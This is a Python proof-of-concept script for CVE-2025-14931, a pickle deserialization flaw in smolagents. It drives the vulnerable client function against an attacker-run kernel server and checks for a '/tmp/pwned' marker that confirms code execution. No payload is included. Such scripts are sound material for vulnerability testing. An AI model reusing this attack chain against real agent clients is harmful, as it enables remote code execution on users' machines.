#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : smolagents Pickle RCE — Trigger Script
# CVE            : CVE-2025-14931
# Vendor         : Hugging Face
# Product        : smolagents
# Affected       : v1.10.0 through v1.24.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 10.0 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-12-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-14931 — Minimal trigger script for quick verification.

Connects to a malicious Jupyter Kernel Gateway server and exercises the
vulnerable _websocket_run_code_raise_errors() code path in smolagents v1.24.0.

ATTACK CHAIN:
  1. Connect to malicious server REST API
  2. Create kernel and open WebSocket
  3. Call _websocket_run_code_raise_errors() → triggers pickle.loads() on response
  4. Verify RCE via marker file

PREREQUISITES:
  - smolagents==1.24.0 installed
  - requests and websocket-client packages

REFERENCES:
  - CVE-2025-14931
  - https://www.zerodayinitiative.com/advisories/ZDI-25-1143/
"""

import argparse
import json
import os
import sys
import requests
from websocket import create_connection

# Import the vulnerable function directly from smolagents
from smolagents.remote_executors import _websocket_run_code_raise_errors


class SimpleLogger:
    """Minimal logger that satisfies smolagents' logger interface."""

    def log(self, msg, level=None):
        print(f"[LOG] {msg}", file=sys.stderr)

    def log_error(self, msg):
        print(f"[ERROR] {msg}", file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-14931 PoC trigger")
    parser.add_argument("--server-host", required=True, help="Malicious server hostname/IP")
    parser.add_argument("--server-port", type=int, default=8888, help="Malicious server port")
    args = parser.parse_args()

    base_url = f"http://{args.server_host}:{args.server_port}"
    logger = SimpleLogger()

    # ── Step 1: Check server readiness (mimics _wait_for_server) ──
    print(f"[*] Checking server readiness at {base_url}/api/kernelspecs ...")
    try:
        resp = requests.get(f"{base_url}/api/kernelspecs", timeout=5)
        assert resp.status_code == 200, f"Unexpected status: {resp.status_code}"
        print(f"[+] Server is ready (HTTP {resp.status_code})")
    except Exception as e:
        print(f"[-] Server not ready: {e}")
        sys.exit(1)

    # ── Step 2: Create kernel (mimics _create_kernel_http) ──
    print(f"[*] Creating kernel via POST {base_url}/api/kernels ...")
    resp = requests.post(f"{base_url}/api/kernels")
    assert resp.status_code == 201, f"Unexpected status: {resp.status_code}"
    kernel_id = resp.json()["id"]
    print(f"[+] Kernel created: {kernel_id}")

    # ── Step 3: Connect WebSocket and trigger vulnerable code path ──
    ws_url = f"ws://{args.server_host}:{args.server_port}/api/kernels/{kernel_id}/channels"
    print(f"[*] Connecting WebSocket to {ws_url} ...")

    ws = create_connection(ws_url)
    print(f"[+] WebSocket connected")

    # ── Step 4: Execute code via the vulnerable path ──
    # This calls _websocket_run_code_raise_errors() which will:
    #   1. Send an execute_request message
    #   2. Wait for responses
    #   3. When it receives ename="FinalAnswerException", call:
    #      pickle.loads(base64.b64decode(evalue))
    #   → ARBITRARY CODE EXECUTION occurs here
    print(f"[*] Sending code execution request (triggers pickle.loads on response)...")
    print(f"[*] If the server returns a malicious pickle payload, RCE occurs NOW...")

    try:
        result = _websocket_run_code_raise_errors("print('hello')", ws, logger)
        print(f"[+] Code execution returned: {result}")
        print(f"[+] is_final_answer: {result.is_final_answer}")
    except Exception as e:
        print(f"[!] Exception during execution: {type(e).__name__}: {e}")

    ws.close()

    # ── Step 5: Check for RCE evidence ──
    marker = "/tmp/pwned"
    if os.path.exists(marker):
        print(f"\n[!!!] RCE CONFIRMED — marker file {marker} exists!")
        print(f"[!!!] pickle.loads() executed attacker's code on the client!")
        sys.exit(0)
    else:
        print(f"\n[*] Marker file {marker} not found (payload may use different indicator)")
        sys.exit(0)


if __name__ == "__main__":
    main()
